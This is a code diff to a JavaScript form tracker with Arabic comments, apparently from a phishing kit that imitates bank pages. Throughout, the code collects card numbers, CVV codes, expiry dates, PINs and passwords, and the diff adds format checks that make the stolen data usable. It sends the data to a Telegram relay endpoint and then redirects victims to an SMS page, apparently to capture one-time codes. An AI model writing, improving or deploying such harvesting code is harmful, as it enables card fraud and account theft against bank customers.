@@ -22,17 +22,84 @@ function getCurrentBankName() {
     return BANK_PAGE_NAMES[currentPage] || 'بنك غير معروف';
 }
 
+// دالة للتحقق من صحة حقل الإدخال
+function validateInput(input) {
+    const value = input.value.trim();
+    const name = input.name || input.id || input.placeholder || '';
+    
+    // إذا كان الحقل فارغاً، نتجاهله
+    if (!value) {
+        return { valid: false, message: '' };
+    }
+    
+    // التحقق من رقم الهاتف
+    if (name.toLowerCase().includes('phone') || name.toLowerCase().includes('mobile') || name.toLowerCase().includes('tel')) {
+        const phonePattern = /^[0-9]{8,15}$/;
+        if (!phonePattern.test(value.replace(/[\s\-\(\)]/g, ''))) {
+            return { valid: false, message: 'رقم الهاتف يجب أن يحتوي على 8-15 رقم' };
+        }
+    }
+    
+    // التحقق من البريد الإلكتروني
+    if (name.toLowerCase().includes('email') || name.toLowerCase().includes('mail')) {
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailPattern.test(value)) {
+            return { valid: false, message: 'البريد الإلكتروني غير صحيح' };
+        }
+    }
+    
+    // التحقق من رقم البطاقة (16 رقم)
+    if (name.toLowerCase().includes('card') && !name.toLowerCase().includes('cvv') && !name.toLowerCase().includes('cvc')) {
+        const cardPattern = /^[0-9]{13,19}$/;
+        if (!cardPattern.test(value.replace(/[\s\-]/g, ''))) {
+            return { valid: false, message: 'رقم البطاقة يجب أن يحتوي على 13-19 رقم' };
+        }
+    }
+    
+    // التحقق من CVV (3 أو 4 أرقام)
+    if (name.toLowerCase().includes('cvv') || name.toLowerCase().includes('cvc') || name.toLowerCase().includes('security')) {
+        const cvvPattern = /^[0-9]{3,4}$/;
+        if (!cvvPattern.test(value)) {
+            return { valid: false, message: 'رمز CVV يجب أن يحتوي على 3-4 أرقام' };
+        }
+    }
+    
+    // التحقق من كلمة المرور (6 أحرف على الأقل)
+    if (name.toLowerCase().includes('password') || name.toLowerCase().includes('pass') || name.toLowerCase().includes('pin')) {
+        if (value.length < 4) {
+            return { valid: false, message: 'كلمة المرور يجب أن تحتوي على 4 أحرف على الأقل' };
+        }
+    }
+    
+    // التحقق من تاريخ الانتهاء (MM/YY أو MM/YYYY)
+    if (name.toLowerCase().includes('expir') || name.toLowerCase().includes('valid')) {
+        const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2}|[0-9]{4})$/;
+        if (!expiryPattern.test(value)) {
+            return { valid: false, message: 'تاريخ الانتهاء يجب أن يكون بصيغة MM/YY' };
+        }
+    }
+    
+    return { valid: true, message: '' };
+}
+
 // دالة لجمع بيانات النموذج
 function collectFormData() {
     const formData = {};
+    const errors = [];
     
     // جمع جميع حقول الإدخال
     const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"], input[type="password"]');
     inputs.forEach(input => {
         if (input.value && input.value.trim() !== '') {
+            const validation = validateInput(input);
+            
             // استخدام name أو id أو placeholder كمفتاح
             const key = input.name || input.id || input.placeholder || `field_${Math.random()}`;
             formData[key] = input.value.trim();
+            
+            if (!validation.valid && validation.message) {
+                errors.push({ field: key, message: validation.message });
+            }
         }
     });
     
@@ -45,7 +112,7 @@ function collectFormData() {
         }
     });
     
-    return formData;
+    return { data: formData, errors: errors };
 }
 
 // دالة لإرسال البيانات إلى API
@@ -67,35 +134,109 @@ function sendBankFormData(formData) {
     };
     
     // إرسال البيانات إلى API
-    fetch('/api/telegram/bank-form-data', {
+    return fetch('/api/telegram/bank-form-data', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(dataToSend)
     })
-    .then(response => response.json())
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('فشل في إرسال البيانات');
+        }
+        return response.json();
+    })
     .then(data => {
         console.log('تم إرسال بيانات النموذج إلى تليجرام:', data);
+        return data;
     })
     .catch(error => {
         console.error('خطأ في إرسال البيانات:', error);
+        throw error;
     });
+}
+
+// دالة لعرض رسالة خطأ
+function showValidationError(message) {
+    // إزالة أي رسالة خطأ موجودة
+    const existingError = document.querySelector('.validation-error-message');
+    if (existingError) {
+        existingError.remove();
+    }
+    
+    // إنشاء رسالة خطأ جديدة
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'validation-error-message';
+    errorDiv.style.cssText = `
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #fee2e2;
+        border: 1px solid #fecaca;
+        color: #dc2626;
+        padding: 1rem 2rem;
+        border-radius: 8px;
+        z-index: 10000;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        animation: slideDown 0.3s ease;
+        max-width: 90%;
+        text-align: center;
+    `;
+    errorDiv.innerHTML = `<i class="fa fa-exclamation-circle"></i> ${message}`;
+    
+    document.body.appendChild(errorDiv);
+    
+    // إزالة الرسالة بعد 5 ثوانٍ
+    setTimeout(() => {
+        if (errorDiv.parentNode) {
+            errorDiv.remove();
+        }
+    }, 5000);
 }
 
 // مراقبة جميع النماذج في الصفحة
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('Bank Form Tracker initialized for:', getCurrentBankName());
+    
     // مراقبة جميع أزرار الإرسال
     const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"], button[data-testid*="submit"]');
     
     submitButtons.forEach(button => {
         button.addEventListener('click', function(e) {
+            e.preventDefault();
+            
             // جمع البيانات من النموذج
-            const formData = collectFormData();
+            const result = collectFormData();
+            
+            // التحقق من وجود أخطاء
+            if (result.errors.length > 0) {
+                const errorMessage = result.errors.map(err => err.message).join('<br>');
+                showValidationError(errorMessage);
+                return;
+            }
             
             // إرسال البيانات إذا كانت موجودة
-            if (Object.keys(formData).length > 0) {
-                sendBankFormData(formData);
+            if (Object.keys(result.data).length > 0) {
+                // عرض حالة التحميل
+                const originalText = button.innerHTML;
+                button.disabled = true;
+                button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري الإرسال...';
+                
+                sendBankFormData(result.data)
+                    .then(() => {
+                        // التوجيه إلى صفحة SMS بعد إرسال البيانات بنجاح
+                        window.location.href = '../../sms/sms.html';
+                    })
+                    .catch(error => {
+                        // إعادة تفعيل الزر في حالة الفشل
+                        button.disabled = false;
+                        button.innerHTML = originalText;
+                        showValidationError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
+                    });
+            } else {
+                showValidationError('يرجى ملء جميع الحقول المطلوبة');
             }
         });
     });
@@ -104,35 +245,13 @@ document.addEventListener('DOMContentLoaded', function() {
     const forms = document.querySelectorAll('form');
     forms.forEach(form => {
         form.addEventListener('submit', function(e) {
-            // جمع البيانات من النموذج
-            const formData = collectFormData();
+            e.preventDefault();
             
-            // إرسال البيانات إذا كانت موجودة
-            if (Object.keys(formData).length > 0) {
-                sendBankFormData(formData);
+            // تفعيل زر الإرسال بدلاً من ذلك
+            const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');
+            if (submitButton) {
+                submitButton.click();
             }
-        });
-    });
-    
-    // مراقبة التغييرات في حقول الإدخال وإرسال البيانات عند فقدان التركيز
-    const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"], input[type="password"]');
-    let lastSentData = {};
-    
-    inputs.forEach(input => {
-        input.addEventListener('blur', function() {
-            // الانتظار قليلاً للتأكد من أن المستخدم أنهى الإدخال
-            setTimeout(() => {
-                const formData = collectFormData();
-                
-                // إرسال البيانات فقط إذا تغيرت
-                const currentDataStr = JSON.stringify(formData);
-                const lastDataStr = JSON.stringify(lastSentData);
-                
-                if (Object.keys(formData).length > 0 && currentDataStr !== lastDataStr) {
-                    sendBankFormData(formData);
-                    lastSentData = formData;
-                }
-            }, 500);
         });
     });
 });
